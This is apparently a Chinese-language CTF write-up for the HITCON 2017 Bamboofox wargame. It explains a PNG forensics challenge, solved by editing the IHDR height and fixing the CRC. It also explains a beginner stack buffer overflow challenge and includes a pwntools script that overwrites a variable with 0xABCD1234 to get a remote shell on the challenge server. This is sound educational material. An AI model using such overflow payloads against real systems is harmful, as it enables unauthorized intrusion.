---
layout: post
title: 'HITCON2017-Bamboofox Wargame'
date: '2017-08-25'
tags: 'bamboofox hitcon2017'
author: 'racterub'
---
只解出兩題, 剩下的因為我太廢不會繞保護所以沒解QQ

## Forensic [100]
### Description:
```這張照片應該要有旗子在上面的阿，奇怪?
聽說他被裁剪過，不過好像不是用正規的圖片編輯軟體處理的，真是的...怎麼裁剪的這麼暴力...
拜託了，幫我把旗子找出來，不然...
等等有人來了...快躲起來...
( 瀏覽器上面瀏覽可能是黑的，建議載下來看喔 )
```
題目檔: [Height_is_weird](../../static/file/height_is_weird.zip)

這題題目已經提示要改圖片高度所以在hexeditor中找到png的寬高設定 [png格式說明書](http://www.w3.org/TR/PNG/#11IHDR)
所以把高增加到想要的高度(in HEX)
然後再用pngcheck把CRC重新算一遍再更正就可以囉


## Pwn [100]
### Description:
```
nc bamboofox.cs.nctu.edu.tw 22001

FLAG 在 /home/ctf 底下

歡迎來到 PWN 的世界
恩...這題就是 buffer overflow 的基礎簡單入門題
有哪邊不會可以來我們在 HITCON 的攤位問問題喔
會的人應該 1 分鐘就解完了吧?
恩我廢話好多喔...
總之就是想辦法拿到 FLAG 吧
```
主辦方很佛心地給了src
題目檔: [binary100.c](../../static/file/binary_100.c) [binary100](../../static/file/binary_100)

這題題目很好心的給了原始碼 ~~那就不開gdb了~~

這題題目是考`LIFO+BOF`
在記憶體裡長這樣:
```
+----------------+
|                |
|                |
|      text      |  <-- text's buffer (40byte)
|                |
|                |
| -------------- |
| to_be_overflow |  <-- to_be_overflow's pointer
+----------------+
```
在程式中`to_be_overflow`必須等於`0xABCD1234`才有shell
所以只要在text的buffer塞滿垃圾, 在把`to_be_overflow`蓋掉直接變成`0xABCD1234`就可以取得shell

所以payload會長這樣:
```python
#!/usr/bin/env python

from pwn import *

r = remote('bamboofox.cs.nctu.edu.tw', '22001')

r.sendline('A'*40 + '\x34\x12\xCD\xAB')

r.interactive()
```
